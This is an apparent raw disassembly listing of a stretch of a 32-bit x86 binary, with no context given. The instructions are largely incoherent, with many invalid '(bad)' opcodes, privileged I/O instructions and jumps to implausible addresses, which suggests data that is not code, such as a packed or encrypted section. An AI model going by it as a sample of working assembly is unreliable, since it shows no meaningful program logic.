  41d924:	or     ebx,DWORD PTR ds:0xbb564bd4
  41d92a:	fisttp DWORD PTR [ebx+0x7c1527c1]
  41d930:	inc    edx
  41d931:	push   esi
  41d932:	cmp    DWORD PTR [ecx],eax
  41d934:	mov    ah,BYTE PTR [edi+0x7f]
  41d937:	jg     0x41d8e7
  41d939:	test   al,0xe2
  41d93b:	add    DWORD PTR [ebx+0x3c],0x3d
  41d93f:	clc    
  41d940:	dec    ecx
  41d941:	adc    ch,BYTE PTR [eiz*8+0x466ac3ef]
  41d948:	fdiv   QWORD PTR [eax-0x4a]
  41d94b:	adc    eax,0x998b73ae
  41d950:	mov    edx,0xd882aed3
  41d955:	push   ebx
  41d956:	das    
  41d957:	stos   BYTE PTR es:[edi],al
  41d958:	mov    esp,0xdce17cef
  41d95d:	xor    dl,BYTE PTR [ebp+0x1b2021a1]
  41d963:	add    al,0x5
  41d965:	mov    ebx,0xb57cb1c3
  41d96a:	add    ebp,DWORD PTR [esi-0x2b]
  41d96d:	xchg   bh,ah
  41d96f:	dec    ecx
  41d970:	idiv   BYTE PTR [ebx]
  41d972:	xchg   ecx,eax
  41d973:	push   esi
  41d974:	and    eax,0x20442a44
  41d979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d97a:	pop    esi
  41d97b:	sub    BYTE PTR ss:[ebp-0x49],bl
  41d97f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41d981:	repnz lds edi,FWORD PTR [ecx-0x3f5926c]
  41d988:	lds    eax,FWORD PTR [ebx*1-0x45b4ffce]
  41d98f:	and    BYTE PTR [eax],ah
  41d991:	or     esp,DWORD PTR [eax-0xd]
  41d994:	stos   DWORD PTR es:[edi],eax
  41d995:	or     eax,0x7693e896
  41d99a:	xor    eax,DWORD PTR ds:0x6b71ed47
  41d9a0:	repz mov ah,BYTE PTR [edi-0x78ae88e2]
  41d9a7:	mov    esi,0x7bc7794e
  41d9ac:	push   esi
  41d9ad:	int    0x14
  41d9af:	call   0x74869d4
  41d9b4:	data16 jno 0x41d958
  41d9b7:	jnp    0x41d939
  41d9b9:	call   0x1c1e2f54
  41d9be:	push   edx
  41d9bf:	pop    ss
  41d9c0:	mov    dl,0xf1
  41d9c2:	cmp    edi,DWORD PTR [edi]
  41d9c4:	and    eax,0x41841b1d
  41d9c9:	xchg   ebp,eax
  41d9ca:	pushf  
  41d9cb:	cmc    
  41d9cc:	lods   eax,DWORD PTR ds:[esi]
  41d9cd:	lods   eax,DWORD PTR ds:[esi]
  41d9ce:	adc    DWORD PTR [ebx+0x22c752f6],esi
  41d9d4:	stc    
  41d9d5:	push   ss
  41d9d6:	xor    DWORD PTR [edx-0x60],esp
  41d9d9:	mov    bh,dl
  41d9db:	cmp    ch,bh
  41d9dd:	push   es
  41d9de:	fimul  WORD PTR [ebx-0x2c]
  41d9e1:	sub    BYTE PTR [edi*2-0x7ed5b94e],dl
  41d9e8:	xchg   edi,eax
  41d9e9:	pop    esp
  41d9ea:	imul   edx,DWORD PTR [edx+ebp*1],0x68d913dc
  41d9f1:	(bad)  
  41d9f2:	popf   
  41d9f3:	sub    eax,0x81273348
  41d9f8:	retf   0x47a4
  41d9fb:	jp     0x41da13
  41d9fd:	jne    0x41d9d9
  41d9ff:	mov    ecx,0xf92f0690
  41da04:	jae    0x41da81
  41da06:	ficomp WORD PTR [edi]
  41da08:	test   eax,0x658e7d32
  41da0d:	pop    eax
  41da0e:	sub    BYTE PTR [ebx],dh
  41da10:	call   DWORD PTR [eax]
  41da12:	imul   ebx,DWORD PTR [ebp+0x56],0x43
  41da16:	repz jmp DWORD PTR [esi]
  41da19:	mov    cl,0x81
  41da1b:	fs pop ebp
  41da1d:	sti    
  41da1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da1f:	pop    esi
  41da20:	fld    TBYTE PTR [esp+eax*8-0x2de668da]
  41da27:	xchg   esi,eax
  41da28:	call   0x5db772aa
  41da2d:	and    esp,esi
  41da2f:	mov    ebx,0xbcde91ff
  41da34:	and    BYTE PTR [esi-0x2e],al
  41da37:	jg     0x41da4b
  41da39:	int    0xb2
  41da3b:	xor    bh,bh
  41da3d:	mov    esp,0xd6d36788
  41da42:	shl    bh,cl
  41da44:	jbe    0x41d9da
  41da46:	xor    eax,DWORD PTR [esp+eax*4+0x76]
  41da4a:	mov    ecx,0xe6d73165
  41da4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da50:	call   0x8dc190
  41da55:	mov    esp,0xed41b58e
  41da5a:	stos   DWORD PTR es:[edi],eax
  41da5b:	mov    BYTE PTR ds:[edi-0x5ebe5a67],dh
  41da62:	add    BYTE PTR ds:0x53a228e3,bl
  41da68:	addr16 jb 0x41da22
  41da6b:	in     eax,dx
  41da6c:	adc    al,0x76
  41da6e:	ss dec esi
  41da70:	out    dx,eax
  41da71:	imul   ebp,DWORD PTR [ebp+0x71],0x7d2af8aa
  41da78:	out    0xba,al
  41da7a:	xchg   edx,eax
  41da7b:	adc    eax,0xd0caaa30
  41da80:	inc    edi
  41da81:	cmp    al,0x5f
  41da83:	lahf   
  41da84:	lds    ecx,FWORD PTR [edx]
  41da86:	arpl   bx,sp
  41da88:	push   cs
  41da89:	aam    0x4b
  41da8b:	ror    DWORD PTR [eax+0x6d],cl
  41da8e:	imul   esi,DWORD PTR [ebp-0x46c710e5],0x271ec3d2
  41da98:	es ins BYTE PTR es:[edi],dx
  41da9a:	or     edx,edi
  41da9c:	dec    esp
  41da9d:	adc    eax,0x722608c4
  41daa2:	jo     0x41db1f
  41daa4:	and    eax,0x4ff5191c
  41daa9:	xchg   esp,eax
  41daaa:	repz test eax,0xe7039f32
  41dab0:	lods   eax,DWORD PTR ds:[esi]
  41dab1:	scas   eax,DWORD PTR es:[edi]
  41dab2:	popf   
  41dab3:	dec    ecx
  41dab4:	mov    al,ds:0xe6f74f4b
  41dab9:	and    BYTE PTR [ebp+0x59],al
  41dabc:	rcl    DWORD PTR [edx+0x7eb210e4],cl
  41dac2:	jo     0x41dad1
  41dac4:	test   al,0x7b
  41dac6:	(bad)
  41dac9:	pushf  
  41daca:	jne    0x41da50
  41dacc:	fsubr  DWORD PTR [esi+ebp*1]
  41dacf:	mov    al,ds:0xfc93f723
  41dad4:	add    ah,BYTE PTR [eax]
  41dad6:	iret   
  41dad7:	mov    ebx,0x5bb3a768
  41dadc:	out    dx,eax
  41dadd:	mov    dh,BYTE PTR [ecx-0x6928332f]
  41dae3:	push   edi
  41dae4:	popa   
  41dae5:	add    edi,eax
  41dae7:	xchg   ebp,eax
  41dae8:	and    dh,dh
  41daea:	add    eax,0xadaf33d4
  41daef:	xchg   BYTE PTR [ecx],ch
  41daf1:	sbb    DWORD PTR [eax+0x261dd2dc],esp
  41daf7:	pushf  
  41daf8:	xchg   ebp,eax
  41daf9:	mov    edx,DWORD PTR [esi-0x4]
  41dafc:	test   al,0xa7
  41dafe:	fcomi  st,st(1)
  41db00:	jp     0x41db36
  41db02:	jnp    0x41dab1
  41db04:	push   edi
  41db05:	jl     0x41dad7
  41db07:	arpl   bx,dx
  41db09:	inc    edx
  41db0a:	ja     0x41daa5
  41db0c:	fs out 0x75,al
  41db0f:	xchg   edi,eax
  41db10:	inc    esp
  41db11:	daa    
  41db12:	test   eax,0xe0510c1a
  41db17:	outs   dx,BYTE PTR ds:[esi]
  41db18:	popa   
  41db19:	mov    eax,0xc2a830a3
  41db1e:	sub    al,0x23
  41db20:	mov    esp,0xeba35bc8
  41db25:	les    edx,FWORD PTR [edx-0x67]
  41db28:	jns    0x41db6d
  41db2a:	enter  0x27ce,0x1f
  41db2e:	xchg   esp,eax
  41db2f:	(bad)  
  41db30:	push   esp
  41db31:	retf   0x31af
  41db34:	sbb    esp,DWORD PTR [edi]
  41db36:	adc    eax,0xc5dab0f5
  41db3b:	xor    bh,BYTE PTR [eax-0x31]
  41db3e:	mov    ds:0x3f586bf8,al
  41db43:	fwait
  41db44:	les    ecx,FWORD PTR [edx-0x33]
  41db47:	mov    ?,WORD PTR [eax+esi*2+0x18]
  41db4b:	ret    0x2e4b
  41db4e:	int3   
  41db4f:	mov    cl,0x12
  41db51:	test   BYTE PTR [eax],0xe2
  41db54:	adc    al,0x3d
  41db56:	mov    BYTE PTR es:[edi-0x7d],al
  41db5a:	push   ebp
  41db5b:	mov    ebx,0xc18fad03
  41db60:	(bad)  
  41db61:	ds cmc 
  41db63:	popf   
  41db64:	add    al,0x46
  41db66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db67:	cmp    BYTE PTR [eax-0x6f],0x75
  41db6b:	sbb    DWORD PTR [edi-0x3c],esi
  41db6e:	mov    ebx,esi
  41db70:	or     al,0xd0
  41db72:	ss dec edx
  41db74:	xchg   edi,eax
  41db75:	xchg   esi,eax
  41db76:	add    al,0x39
  41db78:	imul   ecx,DWORD PTR [eax],0x75
  41db7b:	fcmovnu st,st(6)
  41db7d:	dec    edi
  41db7e:	mov    BYTE PTR [eax+0x7d],al
  41db81:	call   0x261bdfb0
  41db86:	stos   DWORD PTR es:[edi],eax
  41db87:	push   ecx
  41db88:	cdq    
  41db89:	lea    edx,[eax]
  41db8b:	shl    BYTE PTR [ebx],0x7f
  41db8e:	mov    esp,0xa80fe712
  41db93:	or     DWORD PTR [edi],edx
  41db95:	ja     0x41db9c
  41db97:	push   esp
  41db98:	push   esi
  41db99:	lock sub ch,0x4f
  41db9d:	scas   eax,DWORD PTR es:[di]
  41db9f:	jns    0x41db90
  41dba1:	shl    BYTE PTR [edi-0x3e],1
  41dba4:	or     al,0x1d
  41dba6:	adc    DWORD PTR [ebp+0x4e16f15e],edx
  41dbac:	xchg   ebx,eax
  41dbad:	sahf   
  41dbae:	xchg   esp,eax
  41dbaf:	leave  
  41dbb0:	cmp    eax,0x6dfb3f8f
  41dbb5:	push   es
  41dbb6:	scas   al,BYTE PTR es:[edi]
  41dbb7:	pop    ebp
  41dbb8:	jmp    0xb15c132b
  41dbbd:	add    eax,0x68725bca
  41dbc2:	ds inc ebx
  41dbc4:	seta   BYTE PTR [edi+ebx*8+0x23cbf0c7]
  41dbcc:	jne    0x41db52
  41dbce:	or     bh,al
  41dbd0:	call   0x3f174c72
  41dbd5:	call   DWORD PTR [ebp-0x725a6f44]
  41dbdb:	sub    eax,0x6a6e4f94
  41dbe0:	stos   DWORD PTR es:[edi],eax
  41dbe1:	xchg   ebx,eax
  41dbe2:	cmp    DWORD PTR [eax+0xd],ecx
  41dbe5:	aaa    
  41dbe6:	cmp    eax,0x5df8a8ac
  41dbeb:	jno    0x41db9e
  41dbed:	pop    edi
  41dbee:	jl     0x41dc2a
  41dbf0:	repz popf 
  41dbf2:	cmc    
  41dbf3:	sbb    ebx,ecx
  41dbf5:	adc    cl,BYTE PTR [ebx-0x3]
  41dbf8:	jo     0x41db8f
  41dbfa:	xlat   BYTE PTR ds:[ebx]
  41dbfb:	repz pop edi
  41dbfd:	cmp    DWORD PTR [esi+0x70a4dccf],0x2ab43e36
  41dc07:	(bad)  
  41dc08:	sbb    eax,0xafa36341
  41dc0d:	push   es
  41dc0e:	cld    
  41dc0f:	mov    ds:0x74c3d300,al
  41dc14:	jl     0x41dc11
  41dc16:	out    0xc6,al
  41dc18:	enter  0xc25a,0x7b
  41dc1c:	loopne 0x41dc66
  41dc1e:	lahf   
  41dc1f:	es aad 0x17
  41dc22:	sub    ah,al
  41dc24:	sub    BYTE PTR [bp-0x1f],ah
  41dc28:	addr16 daa 
  41dc2a:	(bad)  
  41dc2b:	fwait
  41dc2c:	cmp    al,BYTE PTR [ecx+edx*4+0x30]
  41dc30:	out    dx,al
  41dc31:	jmp    0x41dc4b
  41dc33:	bound  ebp,QWORD PTR [edi+edi*1]
  41dc36:	mov    eax,0xdf9299c6
  41dc3b:	cmc    
  41dc3c:	adc    bl,bh
  41dc3e:	pop    ss
  41dc3f:	mov    esp,0xa2761755
  41dc44:	scas   al,BYTE PTR es:[edi]
  41dc45:	mov    WORD PTR ds:0x85aca8dc,cs
  41dc4c:	sbb    eax,edi
  41dc4e:	cmc    
  41dc4f:	cmp    ebx,0x14
  41dc52:	or     al,0x59
  41dc54:	inc    esi
  41dc55:	sub    ecx,DWORD PTR [eax-0x2f]
  41dc58:	push   ss
  41dc59:	rep ins DWORD PTR es:[edi],dx
  41dc5b:	fldenv [edx-0x47017592]
  41dc61:	xchg   edx,eax
  41dc62:	ja     0x41dc25
  41dc64:	xor    al,0x98
  41dc66:	and    dl,BYTE PTR [ebx-0x26a3a0bb]
  41dc6c:	push   eax
  41dc6d:	pop    ss
  41dc6e:	dec    eax
  41dc6f:	pushf  
  41dc70:	adc    DWORD PTR [edi+0x923c135],ecx
  41dc76:	sbb    DWORD PTR [esi],ebp
  41dc78:	cmp    ecx,esp
  41dc7a:	and    BYTE PTR [ebx-0x80],al
  41dc7d:	inc    edi
  41dc7e:	fsubr  st,st(5)
  41dc80:	outs   dx,DWORD PTR ds:[esi]
  41dc81:	pop    ecx
  41dc82:	inc    edi
  41dc83:	in     eax,dx
  41dc84:	dec    edx
  41dc85:	sbb    ebp,eax
  41dc87:	lods   al,BYTE PTR ds:[esi]
  41dc88:	ficom  DWORD PTR [esi]
  41dc8a:	xchg   ch,dh
  41dc8c:	add    al,0xe6
  41dc8e:	push   eax
  41dc8f:	pop    edi
  41dc90:	in     al,0x2b
  41dc92:	scas   eax,DWORD PTR es:[edi]
  41dc93:	pop    ebp
  41dc94:	pusha  
  41dc95:	jmp    0x41dcb7
  41dc97:	mov    fs,edi
  41dc99:	adc    eax,0xe4a75adb
  41dc9e:	push   ss
  41dc9f:	cli    
  41dca0:	mov    bl,0x31
  41dca2:	push   ss
  41dca3:	inc    esp
  41dca4:	fild   DWORD PTR [edx+0x63]
  41dca7:	(bad)  
  41dca8:	cmp    dh,bh
  41dcaa:	sub    al,0x28
  41dcac:	in     al,dx
  41dcad:	xor    edi,DWORD PTR [edi]
  41dcaf:	jb     0x41dcb5
  41dcb1:	bound  edi,QWORD PTR [ebx]
  41dcb3:	js     0x41dd0c
  41dcb5:	add    edi,DWORD PTR [edi+0x5fa1ede5]
  41dcbb:	and    ebx,esi
  41dcbd:	fisubr WORD PTR [esp+eax*8+0x641d6557]
  41dcc4:	jmp    0xa2cb0fae
  41dcc9:	fsub   QWORD PTR [eax]
  41dccb:	fsubr  st(3),st
  41dccd:	pop    es
  41dcce:	ds xchg ebp,eax
  41dcd0:	sti    
  41dcd1:	inc    ebx
  41dcd2:	push   esi
  41dcd3:	in     eax,0x49
  41dcd5:	push   edi
  41dcd6:	cwde   
  41dcd7:	cld    
  41dcd8:	sahf   
  41dcd9:	mov    DWORD PTR [ebx-0x4048c1c],ecx
  41dcdf:	fs in  al,0xc
  41dce2:	jbe    0x41dc6b
  41dce4:	cmp    dl,BYTE PTR [edx-0xe6a71c7]
  41dcea:	mov    edi,0xd4ed19f3
  41dcef:	sti    
  41dcf0:	push   ss
  41dcf1:	xlat   BYTE PTR ds:[ebx]
  41dcf2:	add    ch,BYTE PTR [eax-0x4519848b]
  41dcf8:	(bad)  
  41dcf9:	push   0x5972f3b0
  41dcfe:	mov    eax,ds:0x9c39262
  41dd03:	mov    ebx,0xc4180344
  41dd08:	mov    bl,0x36
  41dd0a:	or     al,0x28
  41dd0c:	retf   
  41dd0d:	xchg   edx,eax
  41dd0e:	xchg   esi,eax
  41dd0f:	sbb    al,0x40
  41dd11:	gs ins BYTE PTR es:[edi],dx
  41dd13:	add    DWORD PTR [ebp+ebp*2+0x5356e170],edx
  41dd1a:	xor    eax,0x6319f41d
  41dd1f:	loop   0x41dcac
  41dd21:	jbe    0x41dd34
  41dd23:	mov    dl,bh
  41dd25:	jmp    0xeadbf05e
  41dd2a:	push   edi
  41dd2b:	dec    ebp
  41dd2c:	(bad)  
  41dd2d:	sbb    al,0xf8
  41dd2f:	pusha  
  41dd30:	add    ah,ah
  41dd32:	enter  0xc19b,0xe0
  41dd36:	cs cld 
  41dd38:	in     eax,dx
  41dd39:	pop    ebp
  41dd3a:	adc    bh,BYTE PTR [edx+0x4b]
  41dd3d:	jmp    0x41dccf
  41dd3f:	mov    eax,0xb3339cae
  41dd44:	test   DWORD PTR [ebp+0x2b],ebp
  41dd47:	add    edx,esp
  41dd49:	and    dh,BYTE PTR [ebx+0x2a883b26]
  41dd4f:	cwde   
  41dd50:	pop    es
  41dd51:	xor    DWORD PTR [eax],esp
  41dd53:	loope  0x41dd21
  41dd55:	sbb    eax,0x6bc87dd3
  41dd5a:	ror    BYTE PTR [ecx+0x5],1
  41dd5d:	pop    es
  41dd5e:	sub    DWORD PTR [edx-0x6e],ebp
  41dd61:	jle    0x41dda1
  41dd63:	inc    eax
  41dd64:	sub    bl,BYTE PTR [ebx]
  41dd66:	dec    ebp
  41dd67:	pause  
  41dd69:	enter  0x2af6,0x7
  41dd6d:	xor    eax,0x8d39bceb
  41dd72:	icebp  
  41dd73:	xor    esp,esi
  41dd75:	jae    0x41dd08
  41dd77:	cmp    edi,esi
  41dd79:	adc    dh,BYTE PTR [edi]
  41dd7b:	mov    dl,0x59
  41dd7d:	out    dx,eax
  41dd7e:	in     al,dx
  41dd7f:	xchg   edx,eax
  41dd80:	(bad)  
  41dd81:	shl    BYTE PTR [esi],0x5f
  41dd84:	jp     0x41dd44
  41dd86:	mov    WORD PTR [edx-0x25],es
  41dd89:	inc    esi
  41dd8a:	jp     0x41dd94
  41dd8c:	and    DWORD PTR [edx+ecx*2],edi
  41dd8f:	mov    ch,BYTE PTR [ecx+0x359b2160]
  41dd95:	push   edx
  41dd96:	inc    edi
  41dd97:	pushf  
  41dd98:	jle    0x41dd54
  41dd9a:	fsubr  QWORD PTR [ebx-0x7c95ffdf]
  41dda0:	xor    BYTE PTR [edx+0x40d3d271],dl
  41dda6:	jmp    0xd1f7:0x76276298
  41ddad:	sub    eax,0xb3e59e47
  41ddb2:	adc    ecx,ebx
  41ddb4:	sub    DWORD PTR [eax],0x9
  41ddb7:	jge    0x41dd6b
  41ddb9:	imul   edi,DWORD PTR [ecx+0x714998be],0x707ddd95
  41ddc3:	push   0x56
  41ddc5:	fldcw  WORD PTR [edx+ebp*2-0x3]
  41ddc9:	jmp    0x41ddf9
  41ddcb:	push   esp
  41ddcc:	ror    BYTE PTR [edi-0x78],1
  41ddcf:	xor    ebp,DWORD PTR [ebx+0x179413ab]
  41ddd5:	mov    esi,esp
  41ddd7:	mov    ecx,0xedc39f33
  41dddc:	or     eax,0xdf971e53
  41dde1:	fadd   st,st(7)
  41dde3:	and    al,0x60
  41dde5:	arpl   bx,cx
  41dde7:	mov    al,ds:0x2e25f10e
  41ddec:	push   0xffffffcd
  41ddee:	cs pop ebp
  41ddf0:	dec    eax
  41ddf1:	jne    0x41de0d
  41ddf3:	scas   eax,DWORD PTR es:[edi]
  41ddf4:	sbb    al,0x40
  41ddf6:	xchg   DWORD PTR [esi-0x17],eax
  41ddf9:	inc    edi
  41ddfa:	gs cmc 
  41ddfc:	je     0x41de4a
  41ddfe:	adc    DWORD PTR [esi-0x7e87c41],esp
  41de04:	int3   
  41de05:	scas   eax,DWORD PTR es:[edi]
  41de06:	inc    eax
  41de07:	daa    
  41de08:	xchg   esp,eax
  41de09:	mov    eax,ds:0xfdaaae3b
  41de0e:	mov    ecx,0x1ec0d46
  41de13:	xchg   ch,ch
  41de15:	daa    
  41de16:	add    BYTE PTR [ecx+0x3d3259ef],bh
  41de1c:	xchg   ebx,eax
  41de1d:	dec    esi
  41de1e:	xchg   edx,eax
  41de1f:	test   DWORD PTR [eax],esp
  41de21:	shl    DWORD PTR [edx+0x7b797e6e],0xf7
  41de28:	jg     0x41de1f
  41de2a:	and    BYTE PTR [esi+edx*2+0x4d],cl
  41de2e:	push   0x88b14b9a
  41de33:	dec    esi
  41de34:	rcr    BYTE PTR ds:0xed3ebecf,cl
  41de3a:	arpl   WORD PTR [bx],dx
  41de3d:	ss jge 0x41de02
  41de40:	pop    ebx
  41de41:	iret   
  41de42:	xchg   esi,eax
  41de43:	popa   
  41de44:	fist   WORD PTR [ebx]
  41de46:	sub    dl,bh
  41de48:	sbb    dl,BYTE PTR [ecx+ebx*4]
  41de4b:	push   ecx
  41de4c:	mov    edi,0xeed064d5
  41de51:	leave  
  41de52:	sti    
  41de53:	fldcw  WORD PTR [esi-0x5]
  41de56:	int3   
  41de57:	add    al,0x17
  41de59:	fsubr  DWORD PTR [edx]
  41de5b:	rcr    DWORD PTR [ebp+0x25],1
  41de5e:	or     ecx,ebx
  41de60:	push   ss
  41de61:	mov    DWORD PTR [edi-0xc],ecx
  41de64:	dec    esp
  41de65:	xchg   esi,eax
  41de66:	icebp  
  41de67:	sbb    al,BYTE PTR [edi]
  41de69:	ret    0x7f4b
  41de6c:	mov    dl,0x7
  41de6e:	sub    ah,BYTE PTR [ebx-0x48]
  41de71:	lods   eax,DWORD PTR ds:[esi]
  41de72:	js     0x41de83
  41de74:	add    eax,0x4afff0b9
  41de79:	mov    ecx,0x653ad12e
  41de7e:	popa   
  41de7f:	xchg   BYTE PTR [ebx+ebp*4-0x72],bh
  41de83:	cld    
  41de84:	dec    ebx
  41de85:	arpl   WORD PTR [ebp+0x5210423b],sp
  41de8b:	fidiv  WORD PTR [ebx]
  41de8d:	in     al,dx
  41de8e:	sti    
  41de8f:	outs   dx,DWORD PTR ds:[esi]
  41de90:	test   eax,0x15d13cd1
  41de95:	sti    
  41de96:	add    eax,0x242a4d91
  41de9b:	push   ss
  41de9c:	test   eax,0x2b1761cb
  41dea1:	retf   
  41dea2:	add    edx,DWORD PTR [eax-0x75]
  41dea5:	cmp    DWORD PTR [esi-0x2f],edi
  41dea8:	jo     0x41de7c
  41deaa:	push   ebp
  41deab:	xor    eax,0xa07857b3
  41deb0:	sbb    BYTE PTR [edi],dh
  41deb2:	xor    ah,BYTE PTR [ebp-0x27]
  41deb5:	add    esi,DWORD PTR [ebp-0x6f233d8f]
  41debb:	scas   al,BYTE PTR es:[edi]
  41debc:	mov    eax,0xfec66a6d
  41dec1:	test   BYTE PTR [esi+ebp*2+0xb96b332],al
  41dec8:	jmp    0x41dee2
  41deca:	pop    esi
  41decb:	retf   0xee5e
  41dece:	dec    ebx
  41decf:	xchg   bh,dl
  41ded1:	pop    edi
  41ded2:	adc    cl,BYTE PTR [ebp-0x11]
  41ded5:	add    edx,DWORD PTR [eax]
  41ded7:	xchg   ebp,eax
  41ded8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ded9:	dec    eax
  41deda:	add    eax,0xd2ffb7f6
  41dedf:	enter  0xd7,0xbf
  41dee3:	jbe    0x41de84
  41dee5:	aaa    
  41dee6:	int3   
  41dee7:	mov    esp,0x24191c46
  41deec:	das    
  41deed:	mov    esp,0xcd8f3e3
  41def2:	enter  0xb7ff,0xb0
  41def6:	loop   0x41dec0
  41def8:	mov    ebx,0x70bb3729
  41defd:	adc    ebp,DWORD PTR [edx*4+0x4826f035]
  41df04:	dec    esp
  41df05:	mov    ds:0x72b43119,eax
  41df0a:	repz bound ecx,QWORD PTR [ebp+0x26ff33f3]
  41df11:	push   0xffffff86
  41df13:	mov    WORD PTR [edx],?
  41df15:	clc    
  41df16:	or     dl,0xd7
  41df19:	out    dx,eax
  41df1a:	and    ebp,esi
  41df1c:	scas   al,BYTE PTR es:[edi]
  41df1d:	xchg   ebp,eax
  41df1e:	mov    ds,WORD PTR [ecx+0x4792edb9]
  41df24:	imul   ebx,edi,0xffffffcd
  41df27:	std    
  41df28:	les    edi,FWORD PTR [ecx+0x1cdb24a9]
  41df2e:	into   
  41df2f:	push   eax
  41df30:	(bad)  
  41df32:	rcr    DWORD PTR [edi+0x38c16749],0x8a
  41df39:	adc    DWORD PTR [ebx],ecx
  41df3b:	cmc    
  41df3c:	inc    edi
  41df3d:	sub    BYTE PTR [esi-0x12],al
  41df40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df41:	mov    esi,0xdb2a84e4
  41df46:	fcmovnbe st,st(2)
  41df48:	pop    ebp
  41df49:	or     al,0x4f
  41df4b:	bsr    edx,esi
  41df4e:	xchg   ebx,eax
  41df4f:	(bad)  
  41df50:	rcl    dh,0x79
  41df53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df54:	nop
  41df55:	pop    eax
  41df56:	mov    BYTE PTR [edi+0x12679029],ah
  41df5c:	fst    DWORD PTR [edi]
  41df5e:	dec    ecx
  41df5f:	mov    WORD PTR [edx+0x29d0f1c1],fs
  41df65:	lahf   
  41df66:	mov    esi,0xa63a56d3
  41df6b:	sub    dl,BYTE PTR [edi+0x2]
  41df6e:	or     edx,DWORD PTR [esi-0x26871dd]
  41df74:	imul   eax,DWORD PTR [eax],0x64
  41df77:	adc    DWORD PTR [esi+0x6b],ebp
  41df7a:	ret    0x4856
  41df7d:	mov    ebx,0xccf4c35
  41df82:	adc    eax,0xed4892b0
  41df87:	inc    eax
  41df88:	mov    gs,WORD PTR [edi+0x1839a530]
  41df8e:	xchg   edi,eax
  41df8f:	in     al,dx
  41df90:	xchg   DWORD PTR fs:[edx+0x1a],ebp
  41df94:	cmp    ecx,ebx
  41df96:	(bad)  
  41df97:	cld    
  41df98:	enter  0xde10,0x62
  41df9c:	dec    edi
  41df9d:	int3   
  41df9e:	(bad)  
  41df9f:	in     al,dx
  41dfa0:	mov    eax,0x163669a
  41dfa5:	push   ds
  41dfa6:	call   0x9b79bafd
  41dfab:	dec    esi
  41dfac:	pop    eax
  41dfad:	cmp    BYTE PTR [edx],bl
  41dfaf:	icebp  
  41dfb0:	mov    eax,ds:0x2aa97b22
  41dfb5:	or     eax,DWORD PTR [ecx+0x4d]
  41dfb8:	clc    
  41dfb9:	add    DWORD PTR [edi+0x69d3c848],esp
  41dfbf:	sub    cl,BYTE PTR [esi+0x67feed80]
  41dfc5:	icebp  
  41dfc6:	xor    al,0xeb
  41dfc8:	loop   0x41dfa2
  41dfca:	mov    eax,ds:0x46daa21c
  41dfcf:	add    eax,0xed91577a
  41dfd4:	jle    0x41e01f
  41dfd6:	push   edi
  41dfd7:	mov    dh,0xf8
  41dfd9:	or     al,0x13
  41dfdb:	fisub  WORD PTR [edx]
  41dfdd:	stos   DWORD PTR es:[edi],eax
  41dfde:	test   BYTE PTR [edx],0x7e
  41dfe1:	push   edi
  41dfe2:	ds push ecx
  41dfe4:	stc    
  41dfe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfe6:	int    0x6f
  41dfe8:	fs in  eax,dx
  41dfea:	sar    DWORD PTR [edx+0x1ea0ac06],1
  41dff0:	xchg   DWORD PTR [edi],edx
  41dff2:	in     al,dx
  41dff3:	mov    bl,ah
  41dff5:	add    ebp,esi
  41dff7:	add    bh,BYTE PTR cs:[esi-0x4ba7a23]
  41dffe:	sbb    al,0x7d
  41e000:	jo     0x41e06e
  41e002:	scas   al,BYTE PTR es:[edi]
  41e003:	(bad)  
  41e005:	sbb    esi,eax
  41e007:	mov    ebp,0x86b16d42
  41e00c:	jp     0x41e05c
  41e00e:	cmp    edx,DWORD PTR [ebx-0x2b]
  41e011:	fisub  DWORD PTR [eax]
  41e013:	push   ecx
  41e014:	ss pop edi
  41e016:	push   edi
  41e017:	and    ah,bl
  41e019:	mov    edi,0x318ca779
  41e01e:	inc    edx
  41e01f:	mov    dh,0x9b
  41e021:	xor    DWORD PTR [eax],0x74
  41e024:	std    
  41e025:	xor    edx,DWORD PTR [ebp-0x6401c0d9]
  41e02b:	aaa    
  41e02c:	jne    0x41e063
  41e02e:	jmp    0x41e05e
  41e030:	fldcw  WORD PTR [eax+0x533f0342]
  41e036:	inc    esp
  41e037:	mov    dh,0xc1
  41e039:	dec    ebx
  41e03a:	mov    esi,DWORD PTR [ebp+0x22]
  41e03d:	cs jne 0x41dfc7
  41e040:	jl     0x41e0bc
  41e042:	jmp    0x41e097
  41e044:	sub    al,BYTE PTR [ebx+edx*2-0x26]
  41e048:	xchg   ecx,eax
  41e049:	rcl    DWORD PTR [ebx],1
  41e04b:	cmp    di,sp
  41e04e:	dec    eax
  41e04f:	arpl   si,bx
  41e051:	pop    ebp
  41e052:	leave  
  41e053:	call   0x8c036af3
  41e058:	cs sti 
  41e05a:	(bad)  [ebx+0x27e01111]
  41e060:	lea    ebp,[esi]
  41e062:	cmp    DWORD PTR [ecx+0x30d04afc],esp
  41e068:	ins    BYTE PTR es:[edi],dx
  41e069:	das    
  41e06a:	call   0x4f940933
  41e06f:	sub    DWORD PTR [edi-0x24c5ee6a],eax
  41e075:	cmp    ebp,DWORD PTR [edx+edx*2]
  41e078:	lock xchg esi,eax
  41e07a:	retf   
  41e07b:	cdq    
  41e07c:	in     eax,dx
  41e07d:	mov    edi,0xd5d22780
  41e082:	sbb    BYTE PTR [ebp+0x47],ah
  41e085:	frstor [edi]
  41e087:	stos   BYTE PTR es:[edi],al
  41e088:	(bad)  
  41e089:	out    0xf8,eax
  41e08b:	popf   
  41e08c:	xchg   edx,eax
  41e08d:	or     bh,0x8d
  41e090:	push   eax
  41e091:	lahf   
  41e092:	cmp    esi,edx
  41e094:	das    
  41e095:	(bad)  
  41e096:	(bad)  
  41e097:	out    0x5d,eax
  41e099:	mov    cl,0x7b
  41e09b:	or     DWORD PTR [ebx],esp
  41e09d:	xor    al,0xc
  41e09f:	fst    DWORD PTR [eax+edx*8-0x4a336542]
  41e0a6:	mov    esi,esp
  41e0a8:	std    
  41e0a9:	mov    ch,0x51
  41e0ab:	cli    
  41e0ac:	pop    ebx
  41e0ad:	pop    ss
  41e0ae:	sub    DWORD PTR [eax-0x35406584],ebp
  41e0b4:	mov    ecx,0x114f988f
  41e0b9:	in     al,0xd6
